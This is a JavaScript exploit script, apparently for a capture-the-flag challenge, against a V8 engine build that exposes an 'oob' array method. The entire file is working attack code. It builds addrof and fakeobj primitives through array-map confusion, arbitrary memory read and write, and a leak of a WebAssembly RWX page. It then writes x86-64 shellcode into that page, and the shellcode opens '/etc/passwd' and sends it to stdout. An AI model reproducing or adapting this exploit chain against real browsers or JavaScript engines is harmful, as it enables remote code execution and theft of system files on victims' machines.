/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var float_arr = [1.1, 2.2, 3.3];
var float_arr_map = float_arr.oob();
var dummy_obj = {"a": 1};
var obj_arr = [dummy_obj];
var obj_arr_map = obj_arr.oob();

// var obj = {"a": 1};
// var obj_arr = [obj];
// var obj_arr_map = obj_arr.oob();

// console.log("[*] Float array map @ " + ftoi_hex(float_arr_map));
// console.log("[*] before exp obj_arr[0]: " + obj_arr[0]);

// obj_arr.oob(float_arr_map);

// console.log("[*] after exp obj_arr[0]: " + ftoi_hex(obj_arr[0]));

// exploit primitive that returns the address of an object
function addrof(in_obj) {
    // place object in the array
    obj_arr[0] = in_obj;
    // change the map of the array to the float array map. This way, obj_arr[0] will be interpreted as a float, instead of an object's address
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    // restore the original map
    obj_arr.oob(obj_arr_map);
    return ftoi(addr);
}

// exploit primitive that places a fake object at a given address
function fakeobj(addr) {
    // place the address in the array
    float_arr[0] = itof(addr);
    // change the map of the float array to the object array map. This way, float_arr[0] will be interpreted as an object, instead of a float. When accesed, it will return the object at the custom address we placed
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    // restore the original map
    float_arr.oob(float_arr_map);
    return fake;
}

// make sure elements array has 2 elements
let arb_rw_arr = [float_arr_map, itof(0x0000000200000000n), 3.3, 4.4];
// arb read primitive
function arb_read(addr) {
    
    // place fake object at arb_rw_arr - 0x20(value of first element of the array). This will be the map of a float arr. At arb_rw_arr - 0x10(aka arb_rw_arr[2]) we place the address we want to read from, as it will be treated as the elements pointer of the fake object. Then just read the value at arb_rw_arr[0]
    // make sure to tag the pointer 
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake_obj = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(addr - 0x10n); // -0x10 because the elements structure has 2 8 byte fields before the actual elemets
    let ret_val = ftoi(fake_obj[0]);
    arb_rw_arr[2] = 3.3;
    return ret_val;
}

function arb_write_util(addr, val) {
    // do the same thing as arb_read, but instead of reading, write the value at fake_obj[0]
    let fake_obj = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(addr - 0x10n);
    console.log(arb_rw_arr);
    fake_obj[0] = itof(val);
    arb_rw_arr[2] = 3.3;
}


// arb write primitive done with DataView and ArrayBuffer
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    // overwrite ArrayBuffer's backing store pointer
    // get original backing store pointer
    let backing_store = arb_read(addrof(buf) + 0x20n);
    arb_write_util(addrof(buf) + 0x20n, addr);
    let dataview = new DataView(buf);
    dataview.setBigUint64(0, BigInt(val), true);
    // restore the original backing store pointer
}

var wasm_bytecode = new Uint8Array([0,97,115,109,1,0,0,0,1,18,4,96,0,0,96,2,127,127,1,127,96,1,127,0,96,0,1,127,3,5,4,0,1,2,3,4,5,1,112,1,2,2,5,6,1,1,130,2,130,2,6,8,1,127,1,65,128,136,4,11,7,117,6,6,109,101,109,111,114,121,2,0,3,97,100,100,0,1,25,95,95,105,110,100,105,114,101,99,116,95,102,117,110,99,116,105,111,110,95,116,97,98,108,101,1,0,11,95,105,110,105,116,105,97,108,105,122,101,0,0,25,95,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,114,101,115,116,111,114,101,0,2,28,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,103,101,116,95,99,117,114,114,101,110,116,0,3,9,7,1,0,65,1,11,1,0,10,25,4,3,0,1,11,7,0,32,0,32,1,106,11,6,0,32,0,36,0,11,4,0,35,0,11]);
var wasm_mod = new WebAssembly.Module(wasm_bytecode);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {});

var f = wasm_instance.exports.add;

// leak RWX page address
let rwx_page = arb_read(addrof(wasm_instance) - 1n + 0x88n);
console.log("[*] RWX page @ 0x" + rwx_page.toString(16));

var shellcode = new Uint8Array([144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,104,114,118,101,1,129,52,36,1,1,1,1,72,184,47,101,116,99,47,112,97,115,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,106,1,95,153,15,5,]);

// write shellcode to RWX page
// fill RWX to maybe cause a crash
let arr_buf = new ArrayBuffer(shellcode.length);
arb_write_util(addrof(arr_buf) + 0x20n, rwx_page);
let dataview = new DataView(arr_buf);
for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}


